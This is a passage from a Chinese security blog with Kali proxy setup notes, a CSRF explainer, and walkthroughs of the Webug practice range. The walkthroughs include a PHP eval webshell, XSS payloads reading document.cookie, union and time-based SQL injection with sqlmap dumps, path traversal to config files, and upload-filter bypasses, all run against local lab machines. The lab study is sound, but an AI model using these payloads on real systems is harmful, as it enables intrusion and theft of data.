<h2 id="安装VMware-Tools"><a href="#安装VMware-Tools" class="headerlink" title="安装VMware Tools"></a>安装VMware Tools</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">apt <span class="keyword">install</span> <span class="keyword">open</span>-vm-tools-desktop fuse</span><br><span class="line"><span class="comment">#重启 </span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h2 id="安装酸酸乳"><a href="#安装酸酸乳" class="headerlink" title="安装酸酸乳"></a>安装酸酸乳</h2><figure class="highlight q"><table><tr><td class="code"><pre><span class="line"># 下载<span class="built_in">ssr</span></span><br><span class="line">https:<span class="comment">//github.com/the0demiurge/CharlesScripts/blob/master/charles/bin/ssr</span></span><br><span class="line"></span><br><span class="line"># 将<span class="built_in">ssr</span>添加到bin目录下 修改权限</span><br><span class="line">mv <span class="built_in">ssr</span> /usr/local/bin</span><br><span class="line">chmod <span class="number">766</span> /usr/local/bin/<span class="built_in">ssr</span></span><br><span class="line"></span><br><span class="line"># 显示帮助信息</span><br><span class="line"><span class="built_in">ssr</span> help</span><br><span class="line"></span><br><span class="line"># 安装<span class="built_in">ssr</span></span><br><span class="line"><span class="built_in">ssr</span> install</span><br><span class="line"></span><br><span class="line"># 配置<span class="built_in">ssr</span></span><br><span class="line"><span class="built_in">ssr</span> config</span><br><span class="line"><span class="comment">//就是这个文件./root/.local/share/shadowsocksr/config.json</span></span><br><span class="line"></span><br><span class="line"># 相关参数</span><br><span class="line"><span class="built_in">ssr</span> start  <span class="comment">//启动</span></span><br><span class="line"><span class="built_in">ssr</span> stop	<span class="comment">//关闭</span></span><br><span class="line"><span class="built_in">ssr</span> uninstall	<span class="comment">//卸载</span></span><br></pre></td></tr></table></figure>
<p>一般情况只需要修改以下有注释的地方</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>: <span class="string">"0.0.0.0"</span>,   <span class="comment">//服务器IP地址</span></span><br><span class="line">    <span class="attr">"server_ipv6"</span>: <span class="string">"::"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>: <span class="number">2333</span>,  <span class="comment">//端口</span></span><br><span class="line">    <span class="attr">"local_address"</span>: <span class="string">"127.0.0.1"</span>, </span><br><span class="line">    <span class="attr">"local_port"</span>: <span class="number">1080</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="attr">"password"</span>: <span class="string">"password"</span>,  <span class="comment">//密码</span></span><br><span class="line">    <span class="attr">"method"</span>: <span class="string">"aes-256-cfb"</span>, <span class="comment">//加密方式</span></span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"auth_aes128_md5"</span>, <span class="comment">//协议</span></span><br><span class="line">    <span class="attr">"protocol_param"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"obfs"</span>: <span class="string">"plain"</span>,  <span class="comment">//混淆方式</span></span><br><span class="line">    <span class="attr">"obfs_param"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"speed_limit_per_con"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"speed_limit_per_user"</span>: <span class="number">0</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="attr">"additional_ports"</span> : &#123;&#125;, </span><br><span class="line">    <span class="attr">"additional_ports_only"</span> : <span class="literal">false</span>, </span><br><span class="line">    <span class="attr">"timeout"</span>: <span class="number">120</span>,</span><br><span class="line">    <span class="attr">"udp_timeout"</span>: <span class="number">60</span>,</span><br><span class="line">    <span class="attr">"dns_ipv6"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"connect_verbose_info"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"redirect"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"fast_open"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>终端命令行代理神器，科学上网，内网穿透渗透必备</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vim</span> /etc/proxychains.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>
<p>编辑配置文件，某尾修改自己的socks5本地代理地址很端口。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">socks5 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br></pre></td></tr></table></figure>
<h2 id="FoxyProxy-Options"><a href="#FoxyProxy-Options" class="headerlink" title="FoxyProxy Options"></a>FoxyProxy Options</h2><p>安装火狐插件 FoxyProxy Options 添加代理 方便浏览网页</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF</title>
    <url>/posts/d12d6355.html</url>
    <content><![CDATA[<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><h2 id="什么是CSRF漏洞"><a href="#什么是CSRF漏洞" class="headerlink" title="什么是CSRF漏洞"></a>什么是CSRF漏洞</h2><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。而XSS是直接盗取了用户的Cookie，从而登录到用户的后台修改相关信息</p>
<a id="more"></a>
<h2 id="CSRF攻击流程"><a href="#CSRF攻击流程" class="headerlink" title="CSRF攻击流程"></a>CSRF攻击流程</h2><p>受害者登录A网站。<br>攻击者引诱受害者访问B网站（B网站是攻击者构造的一个恶意网站）。<br>当用户没有退出A网站或A网站的Cookie没有过期，只要在同一个浏览器中打开B网站，攻击者就可以利用用户的身份进行操作。</p>
<h2 id="CSRF漏洞的主要原因"><a href="#CSRF漏洞的主要原因" class="headerlink" title="CSRF漏洞的主要原因"></a>CSRF漏洞的主要原因</h2><p>请求所有的参数均可确定<br>请求的审核不严格，比如只验证了Cookie</p>
<h2 id="挖掘CSRF漏洞"><a href="#挖掘CSRF漏洞" class="headerlink" title="挖掘CSRF漏洞"></a>挖掘CSRF漏洞</h2><p>特征点：</p>
<ul>
<li>增删改查的交互点</li>
<li>无验证码，无token等</li>
<li>判断服务器是否对referer头判断，是的话尝试能不能绕过正则<br>常出现在修改用户信息，重置密码等等这些功能模块。</li>
</ul>
<h2 id="利用CSRF漏洞"><a href="#利用CSRF漏洞" class="headerlink" title="利用CSRF漏洞"></a>利用CSRF漏洞</h2><p>在利用之前，要知道CSRF漏洞有什么类型，分别有GET型和POST型。<br>这里我是用DVWA靶场做例子<br>打开靶场 进入修改密码的界面 输入密码 </p>
<img src="/posts/d12d6355/1.png" class="" title="This is an 1 image">
<p>进行抓包 发现是get型 无token验证</p>
<img src="/posts/d12d6355/2.png" class="" title="This is an 2 image">
<p>删除referer字段 重放查看是否正常</p>
<img src="/posts/d12d6355/3.png" class="" title="This is an 3 image">
<p>返回正常 那么可以直接构造url</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.248.142:85/vulnerabilities</span><span class="regexp">/csrf/</span>?password_new=admin&amp;password_conf=admin&amp;Change=Change<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>我们把这个链接缩短做成短链接</p>
<img src="/posts/d12d6355/4.png" class="" title="This is an 4 image">
<p>还可以通过burp的功能</p>
<img src="/posts/d12d6355/5.png" class="" title="This is an 5 image">
<img src="/posts/d12d6355/6.png" class="" title="This is an 6 image">
<p>copy代码 然后把代码存放到.html文件中打开就可以了</p>
<h2 id="CSRF漏洞造成的危害"><a href="#CSRF漏洞造成的危害" class="headerlink" title="CSRF漏洞造成的危害"></a>CSRF漏洞造成的危害</h2><ul>
<li>篡改目标网站上的用户数据信息</li>
<li>盗取用户隐私数据</li>
<li>配合XSS漏洞造成更大危害</li>
<li>传播CSRF蠕虫</li>
</ul>
<h2 id="修复CSRF漏洞"><a href="#修复CSRF漏洞" class="headerlink" title="修复CSRF漏洞"></a>修复CSRF漏洞</h2><p>加入token机制，通过token或者session来判断当前用户身份。</p>
<h2 id="防范CSRF漏洞"><a href="#防范CSRF漏洞" class="headerlink" title="防范CSRF漏洞"></a>防范CSRF漏洞</h2><ol>
<li>尽可能使用POST方式。</li>
<li>设置验证码，能够很好遏制CSRF攻击，但是增加验证码降低了用户的体验，所以网站不可能给所有的操作都加上验证码，所以只能将验证码作为一种辅助的手段，在关键业务点设置验证码。</li>
<li>检查HTTP请求的Referer字段，但是这种方法的有效性不高，第一，可以抓包修改该字段；第二，在https跳转到http的情况下，浏览器出于安全考虑，不会发送referer，服务器就无法进行检查了，而且如果该网站同域的其他网站有XSS漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭到攻击。所以说有效性不高。（不靠谱的原因是服务器并不是随时都能获得referer，只能监控是否发生，并且不能防范统一域上的CSRF攻击）</li>
<li>加入Anti-CSRF-Token，也就是发送请求时在HTTP请求中以参数的形式加入一个随机产生的token（一次性随机值），并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域Cookie中这个token值，会进行校验该请求当中的token和Cookie当中的token值是否都存在且相等，当判断出存在且相等才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。（个人觉得此方法能杜绝大部分CSRF攻击，那还有小部分通常是因为网站存在XSS漏洞，从而获取到用户Cookie，这就是CSRF+XSS组合拳）。<br>参考链接：<a href="https://mp.weixin.qq.com/s/0u33kOB4NKJG0uhAWsAh0A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/0u33kOB4NKJG0uhAWsAh0A</a></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Webug靶场-其他</title>
    <url>/posts/382e01ad.html</url>
    <content><![CDATA[<h2 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h2><p>既然是URL跳转 那么就找跳转到外部的链接</p>
<a id="more"></a>
<img src="/posts/382e01ad/1.png" class="" title="This is an 1 image">
<p>上图就是跳转到外部的链接 那么只要修改链接即可</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/url_redirect.php</span>?url=https:<span class="string">//timorblog.cn</span></span><br></pre></td></tr></table></figure>
<p>完成跳转</p>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>查看url</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/file_include.php?filename=../</span>..<span class="regexp">/template/</span>dom_xss.html</span><br></pre></td></tr></table></figure>
<p>我们把后面的参数改成我们想看的参数</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">file_include.php?filename=../../<span class="keyword">sql</span>/webug.<span class="keyword">sql</span></span><br></pre></td></tr></table></figure>
<p>查看效果</p>
<img src="/posts/382e01ad/2.png" class="" title="This is an 2 image">

<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>页面报错了？？？？</p>
<img src="/posts/382e01ad/3.png" class="" title="This is an 3 image">
<p>修改一下php版本就好</p>
<img src="/posts/382e01ad/4.png" class="" title="This is an 4 image">
<p>ok 正常了<br>但是 这页面有什么问题吗  不太懂</p>
<h2 id="webshell爆破"><a href="#webshell爆破" class="headerlink" title="webshell爆破"></a>webshell爆破</h2><p>如果有报错就把php版本降低<br>打开界面是一个大马的webshell<br>就是想办法爆破密码<br>使用burp爆破</p>
<img src="/posts/382e01ad/5.png" class="" title="This is an 5 image">
<p>密码是a1</p>
<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p>查看了一下靶机 他url写错了<br>正确url是</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="section">control</span>/more/ssrf.php?url=localhost/<span class="section">control</span>/xss/xss_1.php?id=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>可以在url后面加入php协议或查看内网网站信息</p>
<img src="/posts/382e01ad/6.png" class="" title="This is an 6 image">]]></content>
      <categories>
        <category>Webug 靶场</category>
      </categories>
  </entry>
  <entry>
    <title>Webug靶场-逻辑漏洞</title>
    <url>/posts/33048d81.html</url>
    <content><![CDATA[<h2 id="越权修改密码"><a href="#越权修改密码" class="headerlink" title="越权修改密码"></a>越权修改密码</h2><p>进入界面后，查看代码</p>
<img src="/posts/33048d81/1.png" class="" title="This is an 1 image">
<p>如果账号密码正确跳转到另一个页面<br>查看数据库里相关的账号</p>
<img src="/posts/33048d81/2.png" class="" title="This is an 2 image">
<p>找到了两个账号 那么我们用aaaa账号去修改admin的密码</p>
<img src="/posts/33048d81/3.png" class="" title="This is an 3 image">
<p>看到url为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">cross_auth_passwd2.php?<span class="attribute">id</span>=2</span><br></pre></td></tr></table></figure>
<p>那么把id=2改成id=1在修改密码查看是否成功</p>
<img src="/posts/33048d81/4.png" class="" title="This is an 4 image">
<p>再去数据库里看一下</p>
<img src="/posts/33048d81/5.png" class="" title="This is an 5 image">
<p>成功修改</p>
<h2 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><p>进入页面 点击立即购买 有一个弹窗 花费了100元</p>
<img src="/posts/33048d81/6.png" class="" title="This is an 6 image">
<p>发现url也有变化 </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">cross_permission_pay.php?<span class="attribute">price</span>=100</span><br></pre></td></tr></table></figure>
<p>这好像开玩笑一样  这么改就可以了？<br>把100修改一下</p>
<img src="/posts/33048d81/7.png" class="" title="This is an 7 image">
<p>开玩笑。。。。。。。</p>
<h2 id="邮箱轰炸"><a href="#邮箱轰炸" class="headerlink" title="邮箱轰炸"></a>邮箱轰炸</h2><p>不知道怎么玩</p>
<h2 id="越权查看admin"><a href="#越权查看admin" class="headerlink" title="越权查看admin"></a>越权查看admin</h2><p>这个没什么好说的 基本和越权修改密码一个步骤</p>
<img src="/posts/33048d81/8.png" class="" title="This is an 8 image">
<img src="/posts/33048d81/9.png" class="" title="This is an 9 image">]]></content>
      <categories>
        <category>Webug 靶场</category>
      </categories>
      <tags>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Webug靶场-文件上传</title>
    <url>/posts/54783098.html</url>
    <content><![CDATA[<h2 id="前端拦截"><a href="#前端拦截" class="headerlink" title="前端拦截"></a>前端拦截</h2><p>先写一个php一句话木马</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<img src="/posts/54783098/1.png" class="" title="This is an 1 image">
<p>还没点上传就拦截  一看就是前端防护 直接用burp上传就好 也可以关闭浏览器js<br>把1.php改成1.jpg burp抓包 点击上传<br>把抓的包丢到repeater里修改后缀为.php<br>点击上传</p>
<img src="/posts/54783098/2.png" class="" title="This is an 2 image">
<p>打开上传的文件执行phpinfo</p>
<img src="/posts/54783098/3.png" class="" title="This is an 3 image">

<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p>这个是真的不好弄 只有jpg、png、gif才可以上传 上传其他的就弹框error<br>00截断    失败<br>1.php.asd    失败<br>::$DATA    失败<br>查看一下代码</p>
<img src="/posts/54783098/4.png" class="" title="This is an 4 image">
<p>白名单过滤<br>最后看到别人写的 在php后面加中文就能绕过了 试一下</p>
<img src="/posts/54783098/5.png" class="" title="This is an 5 image">

<h2 id="畸形文件"><a href="#畸形文件" class="headerlink" title="畸形文件"></a>畸形文件</h2><p>查看代码</p>
<img src="/posts/54783098/6.png" class="" title="This is an 6 image">

<p>str_replace() 函数</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">str<span class="constructor">_replace(<span class="string">"world"</span>,<span class="string">"Peter"</span>,<span class="string">"Hello world!"</span>)</span>;</span><br><span class="line">把字符串 <span class="string">"Hello world!"</span> 中的字符 <span class="string">"world"</span> 替换成 <span class="string">"Peter"</span></span><br></pre></td></tr></table></figure>
<p>可以通过双写绕过<code>pphphp</code></p>
<img src="/posts/54783098/7.png" class="" title="This is an 7 image">

<h2 id="截断上传"><a href="#截断上传" class="headerlink" title="截断上传"></a>截断上传</h2><p>还是截断 和上面的解析漏洞一样 加个中文就可以绕过了</p>
<img src="/posts/54783098/7.png" class="" title="This is an 7 image">

<h2 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h2><p>这个怎么做怎么错 看别人说是作者弄错了  那就不做了</p>
]]></content>
      <categories>
        <category>Webug 靶场</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>Webug靶场-任意文件下载</title>
    <url>/posts/89a7edf4.html</url>
    <content><![CDATA[<h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>打开网页</p>
<a id="more"></a>
<img src="/posts/89a7edf4/1.png" class="" title="This is an 1 image">
<p>把两个下载的url复制下来</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">file_download.php?<span class="attribute">file</span>=template/assets/img/1.txt</span><br><span class="line">file_download.php?<span class="attribute">file</span>=template/assets/img/2.txt</span><br></pre></td></tr></table></figure>
<p>在file后面改成其他文件就可以下载其他文件了<br>如下载index.php文件</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">file_download.php?<span class="keyword">file</span>=<span class="keyword">index</span>.php</span><br></pre></td></tr></table></figure>
<img src="/posts/89a7edf4/2.png" class="" title="This is an 2 image">

<h2 id="mysql配置文件下载"><a href="#mysql配置文件下载" class="headerlink" title="mysql配置文件下载"></a>mysql配置文件下载</h2><p>去百度查一下mysql的文件所在地 然后下载<br>payload</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">ini_file_download.php?<span class="keyword">file</span>=..<span class="regexp">/../</span>..<span class="regexp">/phpstudy/my</span>sql<span class="regexp">/my.ini</span></span><br></pre></td></tr></table></figure>
<img src="/posts/89a7edf4/2.png" class="" title="This is an 2 image">
]]></content>
      <categories>
        <category>Webug 靶场</category>
      </categories>
      <tags>
        <tag>任意文件下载</tag>
      </tags>
  </entry>
  <entry>
    <title>Webug靶场-XSS</title>
    <url>/posts/b360063c.html</url>
    <content><![CDATA[<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>payload</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">xss_1.php<span class="built_in">?id</span>=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<img src="/posts/b360063c/1.png" class="" title="This is an 1 image">
<p>flag:fsdafasdfas</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<img src="/posts/b360063c/2.png" class="" title="This is an 2 image">
<img src="/posts/b360063c/3.png" class="" title="This is an 3 image">
<p>flag:asdfsdfadfsdrew</p>
<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>查看源代码 发现需要闭合</p>
<img src="/posts/b360063c/4.png" class="" title="This is an 4 image">
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/posts/b360063c/5.png" class="" title="This is an 5 image">
<p>flag:uoijkhhnloh</p>
<h2 id="过滤xss"><a href="#过滤xss" class="headerlink" title="过滤xss"></a>过滤xss</h2><p>输入好多次payload发现都被拦截  <code>script</code>输入就被拦截</p>
<img src="/posts/b360063c/6.png" class="" title="This is an 6 image">
<p>那么我们换一种方法<br>payload</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">filter_xss.php?<span class="attribute">id</span>=1&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
<img src="/posts/b360063c/7.png" class="" title="This is an 7 image">
<p>flag:fsdafasdfas<br>结果发现提交错误<br>插卡代码 </p>
<img src="/posts/b360063c/8.png" class="" title="This is an 8 image">
<p>如果对了就跳到id为9的数据上<br>我看了一眼数据库发现id=9是反射型xss的flag<br>id=13才是过滤xss  修改一下重新提交</p>
<img src="/posts/b360063c/9.png" class="" title="This is an 9 image">
<p>flag:poipjklkjppoi</p>
<h2 id="链接注入"><a href="#链接注入" class="headerlink" title="链接注入"></a>链接注入</h2><p>链接注入 那就是可以插入外部链接了呗<br>构造一个a标签看看怎样</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">link_xss.php?<span class="attribute">id</span>=&lt;a <span class="attribute">href</span>=<span class="string">"https://timorblog.cn"</span>&gt;博客&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<img src="/posts/b360063c/10.png" class="" title="This is an 10 image">]]></content>
      <categories>
        <category>Webug 靶场</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Webug靶场-注入</title>
    <url>/posts/dfca0ed5.html</url>
    <content><![CDATA[<h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><p>先把靶机的php版本切换一下 要不然不好使</p>
<a id="more"></a>
<img src="/posts/dfca0ed5/1.png" class="" title="This is an 1 image">
<p>进入页面 输入 <code>&#39;</code>查看回显</p>
<img src="/posts/dfca0ed5/2.png" class="" title="This is an 2 image">
<p>报错了，查看列数</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">manifest_error.php?<span class="built_in">id</span>=<span class="number">1</span>' order <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">manifest_error.php?<span class="built_in">id</span>=<span class="number">1</span>' order <span class="keyword">by</span> <span class="number">2</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>字段3报错，字段2正常 说明有两个字段<br>查看回显位</p>
<img src="/posts/dfca0ed5/3.png" class="" title="This is an 3 image">
<p><code>2</code>回显正常<br>下面就是查库查表查列查数据</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">manifest_error.php?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,database() --+</span><br><span class="line"><span class="comment">//数据库名:webug</span></span><br><span class="line">manifest_error.php?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema='webug' --+</span><br><span class="line"><span class="comment">//所有表名:data_crud,env_list,env_path,flag,sqlinjection,user,user_test  因为是找flag 所以直接查flag表</span></span><br><span class="line">manifest_error.php?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_name='flag' --+</span><br><span class="line"><span class="comment">//列名:id,flag</span></span><br><span class="line">manifest_error.php?id=<span class="number">-1</span>' <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(flag) <span class="keyword">from</span> flag --+</span><br><span class="line"><span class="comment">//flag:dfafdasfafdsadfa</span></span><br></pre></td></tr></table></figure>
<h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><p>如标题 布尔盲注 同样的套公式 我之前文章有写过<br>我先手工太麻烦直接使用sqlmap跑了<br>查库</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">sqlmap</span><span class="selector-class">.py</span> <span class="selector-tag">-u</span> <span class="selector-tag">http</span>:<span class="comment">//192.168.248.144/control/sqlinject/bool_injection.php?id=1 --dbs</span></span><br><span class="line"><span class="comment">//查出的库：</span></span><br><span class="line"><span class="selector-tag">available</span> <span class="selector-tag">databases</span> <span class="selector-attr">[7]</span>:</span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">information_schema</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">mysql</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">performance_schema</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">test</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">webug</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">webug_sys</span></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">webug_width_byte</span></span><br></pre></td></tr></table></figure>
<p>查表</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://192.168.248.144/control/sqlinject/bool_injection.php?id=1 -D webug --tables</span><br><span class="line">//查出的表</span><br><span class="line">Database: webug</span><br><span class="line">[7 tables]</span><br><span class="line">+--------------+</span><br><span class="line">|<span class="string"> user         </span>|</span><br><span class="line">|<span class="string"> data_crud    </span>|</span><br><span class="line">|<span class="string"> env_list     </span>|</span><br><span class="line">|<span class="string"> env_path     </span>|</span><br><span class="line">|<span class="string"> flag         </span>|</span><br><span class="line">|<span class="string"> sqlinjection </span>|</span><br><span class="line">|<span class="string"> user_test    </span>|</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure>
<p>查列</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://<span class="number">192.168</span><span class="number">.248</span><span class="number">.144</span>/control/sqlinject/bool_injection.php?id=<span class="number">1</span> -D webug -T flag <span class="comment">--columns</span></span><br><span class="line"><span class="keyword">Database</span>: webug</span><br><span class="line"><span class="keyword">Table</span>: flag</span><br><span class="line">[<span class="number">2</span> <span class="keyword">columns</span>]</span><br><span class="line">+<span class="comment">--------+-------------+</span></span><br><span class="line">| <span class="keyword">Column</span> | <span class="keyword">Type</span>        |</span><br><span class="line">+<span class="comment">--------+-------------+</span></span><br><span class="line">| flag   | <span class="type">varchar</span>(<span class="number">50</span>) |</span><br><span class="line">| id     | <span class="type">int</span>(<span class="number">11</span>)     |</span><br><span class="line">+<span class="comment">--------+-------------+</span></span><br></pre></td></tr></table></figure>
<p>查数据</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://<span class="number">192.168</span><span class="number">.248</span><span class="number">.144</span>/control/sqlinject/bool_injection.php?id=<span class="number">1</span> -D webug -T flag -C flag <span class="comment">--dump</span></span><br><span class="line"><span class="keyword">Database</span>: webug</span><br><span class="line"><span class="keyword">Table</span>: flag</span><br><span class="line">[<span class="number">1</span> entry]</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| flag             |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| fdsafsdfa        |</span><br><span class="line">+<span class="comment">------------------+</span></span><br></pre></td></tr></table></figure>
<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>延时注入也同上  sqlmap直接跑</p>
<h2 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h2><p>进入页面 </p>
<img src="/posts/dfca0ed5/4.png" class="" title="This is an 4 image">
<p>找到输入框 输入<code>1&#39;</code><br>发现报错信息 <code>Invalid query: SELECT * FROM sqlinjection WHERE content = &#39;1&#39;&#39;</code><br>存在注入<br>检测字段 </p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="attr">keyWordName=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span> <span class="comment">#		//报错</span></span><br><span class="line"><span class="attr">keyWordName=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">2</span> <span class="comment">#		//回显正常</span></span><br></pre></td></tr></table></figure>
<p>查看显示位</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">keyWordName=<span class="number">-1</span>' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="meta">#		<span class="comment">//发现并无显示位</span></span></span><br></pre></td></tr></table></figure>
<p>基本为盲注，测试一下</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">keyWordName=<span class="number">1</span>' <span class="keyword">or</span> <span class="built_in">sleep</span>(<span class="number">10</span>) <span class="meta">#   <span class="comment">//明显有延时直接工具跑</span></span></span><br></pre></td></tr></table></figure>
<h2 id="过滤注入"><a href="#过滤注入" class="headerlink" title="过滤注入"></a>过滤注入</h2><p>查看源代码 发现它过滤了select</p>
<img src="/posts/dfca0ed5/5.png" class="" title="This is an 5 image">
<p>这条限制也没什么用 还是正常的时间盲注</p>
<img src="/posts/dfca0ed5/6.png" class="" title="This is an 6 image">
<p>还是用sqlmap直接跑就行</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>查看代码</p>
